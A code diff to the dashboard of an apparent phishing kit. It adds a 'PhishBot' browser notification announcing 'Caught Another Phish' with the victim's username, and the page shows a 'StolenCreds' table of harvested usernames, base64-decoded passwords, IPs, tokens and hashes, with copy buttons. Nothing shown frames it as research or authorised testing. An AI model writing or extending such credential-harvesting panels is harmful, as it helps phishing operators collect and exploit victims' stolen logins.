@@ -34,6 +34,18 @@ table.blank td {
  
 </HEAD>
 <script>
+
+Notification.requestPermission().then(function(result) {
+  console.log(result);
+});
+
+function NewNotification(username,project) {
+		var img = '../../images/favicon/android-icon-192x192.png';
+		var text = 'Caught Another Phish at '+ project + '! (' + username + ')';
+		var notification = new Notification('PhishBot', { body: text, icon: img });
+}
+
+
 function copyuser(id) {
     const str = document.getElementById(id).innerText;
     const el = document.createElement('textarea');
@@ -157,9 +169,6 @@ $result = $conn->query($sql);
 </TABLE>
 
 <br>
-<form method="post" id="add_details">
-<input type="submit" name="add" id="add" class="btn btn-success" value="Add" />
-</form>
 
 <TABLE id="StolenCreds" BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH><TH style="word-wrap: break-word;
 max-width: 150px;">Hash</TH><TH>Extra Field</TH><TH>Actions</TH></TR>
@@ -209,6 +218,9 @@ uid = Math.floor(Math.random() * 1000000);
     $('#add').attr('disabled', false);
     if(data.username)
     {
+		
+	 NewNotification(data.username,'Test');
+		
      var html = '<tr>';
      html += '<td style="text-align:right" id="user'+uid+'">'+data.username+'<button id="btn" onclick="copyuser(\'user'+uid+'\');"><img src="../images/clipboard-outline.svg" height="20px"/></button></td>';
 	 html += '<td style="text-align:right" id="pass'+uid+'">'+atob(data.password)+'<button id="btn" onclick="copyuser(\'pass'+uid+'\');"><img src="../images/clipboard-outline.svg" height="20px"/></button></td>';
